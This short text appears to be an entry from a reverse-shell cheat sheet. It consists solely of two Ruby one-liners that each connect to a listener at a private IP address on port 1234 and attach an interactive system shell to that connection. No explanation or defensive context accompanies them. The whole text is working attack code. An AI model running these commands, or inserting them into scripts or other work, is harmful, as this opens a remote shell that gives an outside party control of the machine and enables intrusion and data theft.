ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.10.1",1234))'
